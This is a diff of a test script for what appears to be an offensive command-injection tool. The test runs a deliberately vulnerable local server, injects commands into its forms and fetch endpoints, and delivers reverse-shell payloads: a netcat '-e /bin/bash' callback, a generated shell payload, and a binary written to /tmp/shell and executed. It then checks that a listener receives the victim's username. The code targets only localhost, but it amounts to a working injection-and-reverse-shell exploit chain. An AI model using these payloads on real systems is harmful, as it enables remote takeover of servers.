@@ -4,6 +4,31 @@
 
 from payloads import Monkey, Generator
 
+from test_py.vulnserver import app
+
+import os
+import pwd
+import time
+import random
+
+backend = 'express'
+
+def get_current_user():
+    return pwd.getpwuid(os.getuid())[0]
+
+def run_test_server():
+    if backend == 'express':
+        os.system('cd test_js && node vulnserver.js > /dev/null 2> /dev/null')
+    else:
+        app.run(debug=True, port=3111)
+
+from multiprocessing import Process
+
+srv_proc = Process(target=run_test_server)
+srv_proc.start()
+
+time.sleep(1) # wait for server to start
+
 from server import ReverseListener
 
 url = 'http://127.0.0.1:3111/home'
@@ -12,12 +37,14 @@ monkey = Monkey(url)
 
 print('-------------------------Parsing tests-------------------------------')
 
-print(monkey.get_forms())
-print(monkey.get_inputs())
-print(monkey.get_js_endpoints())
-print(monkey.get_js_urls())
-print(monkey.get_js_http_methods())
+# bs4 is a pain in the ass, should I write more tests here?
+assert monkey.get_forms() is not None
+assert monkey.get_inputs() is not None
+assert monkey.get_js_endpoints() is not None
+assert monkey.get_js_urls() is not None
+assert monkey.get_js_http_methods() is not None
 
+print('PASSED✓')
 
 print('-------------------------Form submit tests---------------------------')
 
@@ -25,12 +52,13 @@ injectable = {}
 form_inputs = monkey.get_forms()[0].find_all("input")
 
 for form_input in form_inputs:
-    print(form_input)
-    injectable[form_input.get("name")] = "ls"
+    injectable[form_input.get("name")] = "whoami"
 
 res = monkey.inject_forms(injectable)
 
-print(res)
+assert res.decode() == 'SUCCESS'
+
+print('PASSED✓')
 
 print('-------------------------JS urls submit tests---------------------------')
 
@@ -44,47 +72,56 @@ for (input, url) in zip(inputs, js_urls):
 
 res = monkey.inject_fetch(injectable)
 
-print(res)
+assert res.decode() == 'SUCCESS'
+print('PASSED✓')
 
 print('-------------------------Payload injection tests---------------------')
 
 ip = "127.0.0.1"
-port = 8999
+port = random.randint(12000, 20000)
 
-listener = ReverseListener(ip, port, once=True, cb=lambda: 'ls')
+listener = ReverseListener(ip, port, once=True, cb=lambda: 'whoami')
 
 listener.start()
 
-print('----------------netcat:')
+print('----------------netcat:----------------')
 
 res = monkey.inject_fetch({ 'command': f"nc {ip} {port} -e /bin/bash\n" })
-print(res)
+
+assert res.decode() == 'SUCCESS'
+assert get_current_user() == listener.get_recv().strip()
+
+print('PASSED✓')
 
 listener.stop()
 
-print('----------------shell:')
+print('----------------shell:----------------')
 
 ip = "127.0.0.1"
-port = 8999
+port = random.randint(12000, 20000)
 
-listener = ReverseListener(ip, port, once=True, cb=lambda: 'ls')
+listener = ReverseListener(ip, port, once=True, cb=lambda: 'whoami')
 
 listener.start()
 
 payload = Generator.shell(lhost=ip, lport=port, s='sh')
-print(payload)
+print('injecting payload:', payload)
 
 res = monkey.inject_fetch({ 'command': payload })
-print(res)
+
+assert res.decode() == 'SUCCESS'
+assert get_current_user() in listener.get_recv().strip()
+
+print('PASSED✓')
 
 listener.stop()
 
-print('----------------binary:')
+print('----------------binary:----------------')
 
 ip = "127.0.0.1"
-port = 8999
+port = random.randint(12000, 20000)
 
-listener = ReverseListener(ip, port, once=True, cb=lambda: 'ls')
+listener = ReverseListener(ip, port, once=True, cb=lambda: 'whoami')
 
 listener.start()
 
@@ -94,8 +131,15 @@ assert payload is not None
 cmd = f'printf "{payload}" > /tmp/shell && chmod +x /tmp/shell && /tmp/shell'
 
 res = monkey.inject_fetch({ 'command': cmd })
-print(res)
+
+assert res.decode() == 'SUCCESS'
+assert get_current_user() in listener.get_recv().strip()
+
+print('PASSED✓')
 
 listener.stop()
 
+print('\nALL TESTS PASSED✓✓✓')
+
+srv_proc.terminate()
 quit()
